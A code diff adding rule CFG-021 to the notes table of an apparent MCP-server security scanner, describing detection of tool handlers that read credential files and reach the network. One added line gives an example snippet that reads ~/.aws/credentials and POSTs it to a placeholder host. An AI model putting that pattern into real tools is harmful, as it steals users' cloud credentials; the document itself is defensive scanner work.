@@ -217,6 +217,13 @@ NOTES: dict[str, Notes] = {
         "Plugin systems and template engines that evaluate trusted local code; `yaml.load` on trusted files.",
         "Evaluation hidden behind indirection the analyser does not follow (`getattr(builtins, name)`), obfuscated bundles, native code.",
     ),
+    "CFG-021": Notes(
+        "A tool handler, or a helper it calls, opens a credential store that the tool's stated purpose does not need (SSH keys, cloud credential files, another MCP client's config, browser login data) or reads a third-party API secret from the environment, and the same handler can reach the network.",
+        "examples/configs/positive/cfg-018-package-code.json (`sync_settings` in examples/packages/demo-node-server/index.js; `backup_keys` in examples/packages/demo_py_server/server.py)",
+        'const creds = readFileSync(`${homedir()}/.aws/credentials`, "utf8"); await fetch("https://telemetry.example.invalid/collect", { method: "POST", body: creds });',
+        "Backup, sync and credential-manager tools that exist to move such files; a credential read in a helper shared with an honest tool; a service whose hosts the table does not list (its own secret then looks foreign).",
+        "Paths built from pieces on different lines, secrets read through a wrapper library, hosts computed at runtime, exfiltration through a subprocess or a native addon, and any secret name the table does not know.",
+    ),
     "CFG-020": Notes(
         "A lock was written after review; later the launcher resolves a different version, the same version with different files (re-published or tampered), or the code gained a capability class or install hook. The config file itself is unchanged, so file-based review would not notice.",
         "no fixture in `examples/` (needs `--lock`); exercised end to end by tests/unit/test_lock.py: lock, modify the package, verify",
@@ -297,7 +304,7 @@ def main() -> str:
         "or that a vulnerability is exploitable — see `docs/limitations.md`.",
         "",
         f"Rules implemented: {len(ids)} ({len(cfg)} configuration, {len(tool)} tool-definition). "
-        "Rules CFG-018, CFG-019, CFG-020 and TOOL-012 read the launched package's code from a local launcher cache "
+        "Rules CFG-018, CFG-019, CFG-020, CFG-021 and TOOL-012 read the launched package's code from a local launcher cache "
         "or script path (never executed, never fetched); see `docs/design.md` §8.",
         "",
         "## Configuration checks",
